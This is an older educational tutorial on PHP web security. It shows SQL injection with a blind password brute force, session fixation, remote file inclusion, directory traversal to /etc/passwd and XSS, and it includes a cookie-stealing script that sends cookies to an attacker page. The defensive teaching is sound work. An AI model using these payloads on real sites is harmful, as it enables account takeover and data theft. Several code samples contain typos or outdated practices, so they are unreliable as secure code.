---
weight: 999
url: "/Les_injections_SQL/"
title: "SQL Injections"
description: "Understanding SQL injections, how they work, and how to protect against them in web applications."
categories: ["Security", "Database", "Development"]
date: "2008-05-24T16:41:00+02:00"
lastmod: "2008-05-24T16:41:00+02:00"
tags: ["SQL", "PHP", "Security", "Hacking", "Web Development"]
toc: true
---

## SQL Injections

SQL injection vulnerabilities are among the most common in web applications. Dynamic websites interact with databases that store user information. In some cases, it's possible to manipulate queries to these databases to access often sensitive information.

Note: this document was written in 2006; some versions and configurations of the software mentioned may differ from those specified here. Please refer to the official project websites in case of problems.

The language used to communicate between a PHP script and a database, such as MySQL ([click](https://www-fr.mysql.com/)), is the Structured Query Language, also known as SQL ([click](https://fr.wikipedia.org/wiki/SQL)).

To do this, the web application must dynamically create a string containing the SQL query and send it to the database. This string can include data entered directly by website users.

If this data is not properly validated by the web application, it's possible to hijack the application from its intended use by inserting SQL code into these user inputs.

In the following example, an attacker can inject their own SQL code into one of the queries made by the PHP script that we will study below.

First, the database contains this SQL table:

```sql
CREATE TABLE site_users(
id int,
pseudo varchar(32),
password varchar(32),
email varchar(80),
adresse varchar(200)
);
```

The "email.php" file on the website is a script that displays a person's email based on their ID number. Here's the content of this file:

```php
<?
mySQL_connect('127.0.0.1', 'root', );
mySQL_select_db('my_database');
$q = mySQL_query("SELECT email,pseudo FROM site_users WHERE id=".$_REQUEST[id]);
$r = mySQL_fetch_array($q);
echo "le mail de ".$r[pseudo];."est: ".$r[email];
?>
```

On the link "site.com/email.php?id=45", the website displays the message "le mail de lambda est exemple@secuobs.com". Now if we try a URL like "site.com/email.php?id=45%20or%201=1", the website then displays the message "le mail de exemple est php@secuobs.com"

During this last request, the PHP script executed the following SQL code:

```sql
"SELECT email FROM site_users WHERE id=45 or 1=1".
```

Since the condition "1=1" is always true, we were able to inject SQL code. "exemple" is a test account with ID 1, and "lambda" is another test account with ID 45.

If we try with "id=999999999", the web server will display the message "le mail de est", because there is no user with an ID equal to this value of 99999999.

It will be possible, thanks to this SQL injection, to find a given user's password with a brute force attack ([click](https://fr.wikipedia.org/wiki/Attaque_par_force_brute)).

Using the SQL operators 'LIKE' and '%', we'll make sure that the following SQL command is executed by the web server to the database:

```sql
"SELECT email FROM site_users WHERE id=45 AND password LIKE 'a%'"
```

Which effectively means:

```
email.php?id=45%20AND%20password%20LIKE%20'a%'
```

This SQL command will only return a response if the id field is equal to 45 and if the password field starts with 'a', hence the interest in using '%'. The password does not start with 'a', so the site displays the message "le mail de est".

We continue by testing several letters until we get a response from the SQL server via the web server, that is, the message "le mail de lambda est exemple@secuobs.com".

To find the length of the password, simply brute force its value using:

```
email.php?id=45%20AND%20LENGHT(password)=5
```

In this example, we find the value 5 as the password length.

We continue the operation until obtaining this user's password:

```
Request: email.php?id=45%20AND%20password%20LIKE%20'a%'
Response: "le mail de est"

Request: email.php?id=45%20AND%20password%20LIKE%20'b%'
Response: "le mail de lambda est exemple@secuobs.com"

Request: email.php?id=45%20AND%20password%20LIKE%20'ba%'
Response: "le mail de est"

Request: email.php?id=45%20AND%20password%20LIKE%20'bb%'
Response: "le mail de est"

....

Request: email.php?id=45%20AND%20password%20LIKE%20'be%'
Response: "le mail de lambda est exemple@secuobs.com"

Request: email.php?id=45%20AND%20password%20LIKE%20'bea%'
Response: "le mail de lambda est exemple@secuobs.com"

Request: email.php?id=45%20AND%20password%20LIKE%20'beaa%'
Response: "le mail de est"

....

Request: email.php?id=45%20AND%20password%20LIKE%20'beac%'
Response: "le mail de lambda est exemple@secuobs.com"

Request: email.php?id=45%20AND%20password%20LIKE%20'beaca%'
Response: "le mail de est"

...

Request: email.php?id=45%20AND%20password%20LIKE%20'beach%'
Response: "le mail de lambda est exemple@secuobs.com"
```

The password for user "lambda" is therefore "beach".

To secure this script, it would have been sufficient to replace the SQL query in the PHP script with the following line:

```php
$q = mySQL_query("SELECT email,pseudo FROM site_users WHERE id=".intval($_REQUEST[id]));
```

intval() returns a decimal integer value, so we can be certain that only numbers will be added to the SQL query. To secure a string of this type, place it between ' or " and verify that this string does not contain either of these two characters.

It's also possible to use the SQL_real_escape_string() and mySQL_escape_string() functions for this purpose.

The first is a function of the MySQL library and the second is a function specific to the PHP language. They are effective only if the returned value is surrounded by quotes within the SQL query.

The second function, however, is now obsolete and it's preferable to use the first one cited.

Example of a secure script:

```php
<?
mySQL_connect('127.0.0.1', 'root', );
mySQL_select_db('my_database');

$pseudo = $_REQUEST[pseudo];
if (get_magic_quotes_gpc()) {
$pseudo = stripslashes($pseudo);
}
$pseudo = mySQL_real_escape_string($pseudo);
$q = mySQL_query("SELECT email FROM site_users WHERE pseudo='".$pseudo."'" );
$r = mySQL_fetch_array($q);
echo "le mail de ".$pseudo."est: ".$r[email];
?>
```

Note that these functions do not protect against the use of % and \_ characters; these characters can be used with the LIKE, GRANT, or REVOKE operators.

The MySQL_real_escape_string() function actually requires being already connected to the database to be used, otherwise a FALSE boolean value will be returned.

In this exploitation of SQL injection, we consider that magic quotes ([click](https://ch2.php.net/magic_quotes)) are disabled in the PHP configuration file (php.ini).

Magic quotes is enabled by default in the latest versions of PHP; this option transforms the characters 0x00 to \0 in ASCII, ' to \', and " to \".

However, there are many techniques and variants for exploiting an SQL injection even with magic quotes enabled.

## Session Management

Sessions allow a site to uniquely recognize a user with each request in order to offer them content that is specific to them. However, it's possible for an attacker to steal a user's session to impersonate them and access their private information.

A session identifier is a value generally equal to 128 bits. This value is represented in hexadecimal (e.g., 4d7324727be3bd2e9783078e6d0806e7) and is used to identify a unique person.

It will allow the site to recognize a user with each of their requests in order to provide them with specific actions according to the information saved in the database (or not).

The session identifier must be difficult for an attacker to predict, otherwise the entire confidentiality of the service is compromised, and therefore that of its users.

To create a secure session identifier, you can use the uniqid() function provided by the PHP language:

```php
md5(uniqid(rand(),true));
```

It's important to create a session using the uniqid() function, because creating it solely by generating it randomly with a notion of date and time of creation could allow an attacker to retrieve these session identification information via brute force techniques in some cases.

Another type of attack on sessions exists, which consists of making the victim connect to the site with a session identifier that we will have defined beforehand; so if the victim then identifies themselves on the website with this identifier, we can access their session in order to impersonate them and retrieve sensitive information about their account.

To do this, one would simply need to create a fake website with a domain name resembling that of the targeted site; on this site one could set up a web redirect such as "index.php?PHPSESSID=fakesessid". The link would then look like "index.php?PHPSESSID=4d7324727be3bd2e9783078e6d0806e7":

```php
<?php
header('Location: www.site.com/index.php?PHPSESSID=1234');
?>
```

It's generally necessary for the victim's cookie to also be empty or expired in order to be able to carry out this kind of attack. All that remains is to wait for the victim to identify themselves with their username and password and also go to the URL "index.php?PHPSESSID=fakesessid" to be able to access this victim's session.

To secure your script against this kind of attack, simply regenerate an identifier as soon as authentication has been completed. The script must secure web applications against session identifiers that have never been created beforehand by the server; if there was only the session_start() function, the script would then be vulnerable to this type of attack.

The secure script:

```php
<?php
session_start();

if (!isset($_SESSION['initiated']))
{
session_regenerate_id();
$_SESSION['initiated'] = true;
}
?>
```

It's also possible to regenerate the session identifier during authentication for more security, or even to regenerate it with each request to the server.

## PHP Vulnerabilities

Details of vulnerabilities related to the use of include() and fopen() functions in PHP scripts as well as those associated with Cross Site Scripting flaws, also known by the acronym XSS. Also find the security principles related to these different types of risks.

### The include() Function

This function is fairly well known and used. It allows code to be modularized by dynamically loading a file and executing the PHP code it contains. It also handles local files and streams of type curl, http, ftp, and php.

This allows for code injection, an example with the file "fichiervuln.php" found on the vulnerable site:

```php
<?
include($_REQUEST["page"]);
?>
```

And a file "hack.txt" hosted on any site:

```php
<?
phpinfo();
?>
```

On a vulnerable site, you can notice links like "sitevuln.com/fichiervuln.php?page=contact.html". To exploit the resulting flaw, simply go to the URL "sitevuln.com/fichiervuln.php?page=monserver.com/hack.txt".

We can see that the phpinfo() function has been executed. A hacker can then take control of the server and execute other programs through the system() function, exec() or through a local PHP exploit.

To secure an include(), it's necessary to properly validate the input variable $\_REQUEST["page"]:

```php
<?
$inrep = "./";
$extfichier = ".php";
$page = $inrep.basename(strval($_REQUEST["page"]),$extfichier).$extfichier;
if(file_exist($page))
include($page);
?>
```

In the past, there have been many includes secured only with the file_exist() function which returns a positive response if the file exists locally.

As of PHP version 5, this function handles streams, notably http streams, so it no longer protects against remote code injection or local file code injection.

The strval() function is not necessary on recent versions of PHP. The best way to secure PHP code is still the following:

```php
<?
switch($_REQUEST["page"])
{
case "contact.php":
include("contact.php");
break;
default:
break;
}
?>
```

This method is much less modular, but more optimized.

### The fopen() Function

The fopen() function is very commonly used and allows opening a file or directory to display its content.

Generally, flaws related to this function are of the "directory traversal" type, meaning that the user exits the directory tree that had been normally assigned to them.

```php
<?
$filename = $_REQUEST["idimage"];
$filepath = "/rep/secret/".$filename;
$filesize = @filesize($filepath);

$ext = substr($filename, strrpos($filename, ".") + 1);
if ($ext == "jpg") $ext = "jpeg";

if(@file_exists($filepath)){
Header("HTTP/1.1 200 OK");
Header("Content-type: image/" . $ext);
Header("Content-Length: $filesize");
Header("Content-Disposition: filename=$filename");
Header("Content-Transfer-Encoding: binary");
Header("Cache-Control: store, cache"); // HTTP/1.1
Header("Pragma: cache");
$fp = fopen($filepath, "rb");
if (!fpassthru($fp)) fclose($fp);
}
exit;
?>
```

This script normally allows uploading images. These are stored in a directory not accessible via the Web server (Apache in this case). So you must go through a PHP script to see the photos via a URL like "site.com/bimage.php?idimage=20050124.jpg"

In fact, this script allows reading any local file on the server, with a URL like this: "site.com/bimage.php?idimage=../../../../../../../../../../../etc/passwd"

Here we retrieve the passwd file from the server. Using the well-known "../" we go up through directories. Note that on a SUN Solaris type operating system, the fpassthru() function also allows seeing the content of a directory.

On other operating systems, it's necessary to use the appropriate functions to list directories after opening with the fopen() function.

This vulnerability therefore allows viewing the source code of an .htaccess file or that of an .htpasswd but also the php files themselves to extract SQL logins and passwords while looking for other flaws to exploit in these scripts.

To correctly validate variables given as parameters to a fopen(), a filter is necessary:

```php
<?
// Filtering ..\ is only necessary on Windows operating systems
if(eregi('../',$_REQUEST["idimage"]) || eregi('..\',$_REQUEST["idimage"]))
{
echo "bad input";
exit();// we stop the script
}
//otherwise we continue
$badext = ".php" // we define file extensions to prohibit
$filename = basename($filename,$badext); // allows removing the .php extension and getting the file name without associated directories
$filepath = "/rep/secret/".$filename;
// normal script continuation etc etc
?>
```

Don't put a transcoding function after filtering a variable, otherwise it will make the filter completely useless and it would be easily circumvented.

### XSS: Cross Site Scripting

Cross Site Scripting is a client-side attack, performed by injecting HTML code into the browser. HTML being a tag-based description language, it is generally sufficient to be able to inject the characters < and > in order to exploit a vulnerability of this type:

```php
<?
Echo "bienvenue ".$_REQUEST[nom];
?>
```

This is the classic case of an XSS. Simply visit the URL `"site.com/vuln.php?nom=<script>alert(1337)</script>"`; so we can directly inject HTML code, javascript and all types of code that a browser is able to execute.

Generally magic quotes prevent using javascript with this principle, but here again it can be easily circumvented with a URL such as `"site.com/vuln.php?badvar=%3Cscript%3Ealert%28%22helloworld%22%29%3C/script%3E%3Cnoscript%3E%3Cscript%3E&nom=<script>document.write(unescape(location.href))</script>"`

The badvar variable contains the javascript code that will display "helloworld", we perform a simple document.write() of the site address.

The main use of XSS is cookie theft, its operation is very simple: just open a frame or window to a file storing the cookie passed as a parameter.

The javascript code allowing to steal the cookie would then be the following:

```javascript
<script>
  document.location='www.votresite.com/page.php?cookie=' + document.cookie
</script>
```

The page.php would look like:

```php
<?
$cookie = $_GET['cookie'];
mail("mailduvoleur@hack.com", "le cookie", "$cookie");
?>
```

The thief therefore receives the cookie by email. Some cookies contain sensitive data that can allow identification on a site.

To protect against XSS, simply filter variables before displaying them on the output, this filtering is done using the htmlspecialchars() function which will convert the string to "displayable" HTML characters:

```php
<?
$out = htmlspecialchars($_REQUEST[nom]);
Echo "bienvenue ".$out;
?>
```

## Remote PHP Vulnerability Scanner

Remote PHP Vulnerability Scanner is a tool (among others) that allows testing the security of a website based on PHP scripts. RPVS is used via the command prompt in Windows.

RPVS ([click](https://seclists.org/fulldisclosure/2005/Jan/0552.html)) is actually a multithreaded remote PHP vulnerability scanner. It detects basic PHP flaws that are most reported on the web:

- XSS: Cross Site Scripting (injection of HTML code into the victim's browser),
- SQL Errors (19 different errors), to detect SQL injections that are feasible,
- File inclusion vulnerabilities with include() for example,
- Errors of the fopen() function, to detect functions of this type that are poorly protected.
- Errors of the include() function and resulting insecurities.

The RPVS tool runs in two distinct steps.

During the first step, it will crawl the site pages while staying within the domain and directory of the address passed as an argument.

It collects multiple information about dynamic web pages including variable names associated with pages and values given to each variable.

Forms and variables associated with these forms are also retrieved. It may happen that this first step is "endless" due to a so-called loop crawling. In this case, the "Attack Now" button allows stopping the information gathering and moving on to the next step.

The second step consists of testing the targeted PHP pages for XSS, include(), fopen() flaws and SQL injections with the same single variable.

At this level, there are three scanning modes which are represented by the options -bf, -f, the third and last being the default.

The default scan will take all URLs found directly on the site or reconstructed via forms.

For each URL, RPVS tests each variable one by one, for example "/123456/telechargement.php?outil=nmap.zip&rep=./" will generate two URLs: "/123456/telechargement.php?outil=www.google.fr/webhp%3f<balisexss>%22%27 &rep=./" and "/123456/telechargement.php?outil=nmap.zip&rep=www.google.fr/webhp%3f<balisexss>%22%27".

The -f option for "fast mode" will test all variables of a page at once, an example with '/123456/telechargement.php?outil=www.google.fr/webhp%3f<balisexss>%22%27 &rep=www.google.fr/webhp%3f<balisexss>%22%27&list=www.google.fr/webhp%3f<balisexss>%22%27 ". This mode is very fast but it's also the one that gives the least results.

The -bf option allows trying all possible combinations of inputs. This scan is very slow but allows discovering flaws that other modes do not detect. It's preferable to use it locally and with the verbose mode activated.

Example:

```
/123456/index.php3?search=www.google.fr/webhp%3f<balisexss>%22%27
/123456/index.php3?pages=www.google.fr/webhp%3f<balisexss>%22%27
/123456/index.php3?img=www.google.fr/webhp%3f<balisexss>%22%27&page=
/123456/index.php3?img=www.google.fr/webhp%3f<balisexss>%22%27&page=membres
/123456/index.php3?img=www.google.fr/webhp%3f<balisexss>%22%27&page=forum
/123456/index.php3?img=www.google.fr/webhp%3f<balisexss>%22%27&page=gall
```

The -v option for verbose mode displays the web addresses of the HTTP requests made.

The -aff option for anti-forum filter is simply a very useful filter that allows avoiding crawling all posts from a forum or news system.

It's accompanied by the -sessid=PHPSESSID option to define the name of the variable equivalent to the session identifier, this allows not falling into an endless crawl.

The -rapport option allows creating a report in the rapport.txt file under the current directory.

When launching the program, a transparent window appears with the following information:

- the "nb:" indicators represent the number of HTTP requests made,
- "err fopen" the number of fopen() errors detected,
- "vuln inc" the number of include flaws,
- "err inc" the number of include errors,
- "vuln xss" the number of Cross Site Scripting flaws,
- "err SQL" the number of SQL errors,
- "url:" the last request being processed.

Note that the "Attack Now" button switches to "Wait" as soon as the second step begins.

## Tips

In this fourth and final part of the dossier on the security (and insecurity) of PHP scripts, we find some principles that will allow adding an additional layer of security to scripts developed in this language.

Note: this document was written in 2006; some versions and configurations of the software used according to these versions may be different from those mentioned here; please refer to the official websites of the projects in question in case of problems.

To optimally secure a Web application, you can apply security rules that verify that no input has been modified by the visitor.

For each link, simply add a variable that will serve as a signature of validity for the request.

To generate secure links, the following code:

```php
<?
$secretkey = "highly secret key ";
Echo " code html …. ";
Echo "<a href=\"/page.php?var=course&signature=".md5($secretkey."course");
…
?>
```

The page.php file:

```php
<?
$secretkey = "highly secret key ";
$realsign = md5($secretkey.$_REQUEST["var"]);
If($realsign != $_REQUEST["signature"])
{
Echo "bad input value";
Exit();
}
… rest of the file
?>
```

This ensures that requests originate from the pages of our site.

You should also disable the display of error messages in the PHP configuration or using:

```php
ini_set("error_display",off);
```

This should be placed at the beginning of the script, because each error message gives valuable information to a potential attacker.

There is also a technique for securing a form, which consists of placing a session number that will be stored in a table.

When validating the form, we then check that this number is indeed in the table.

An essential tool for the security of your scripts is the hardened-PHP patch that can be found on the project's official website ([click](https://www.hardened-php.net/)).

The Suhosin project ([click](https://www.secuobs.com/news/19032007-suhosin.shtml)) is also worth studying.

Additional information is available in the following articles (XSRF flaws [click](https://www.secuobs.com/news/24112006-backdoor_javascript.shtml)) and (PHP flaws month - [click](https://www.secuobs.com/news/11022007-php_month.shtml)).

## Resources
- http://www.secuobs.com/news/10052008-php_security.shtml
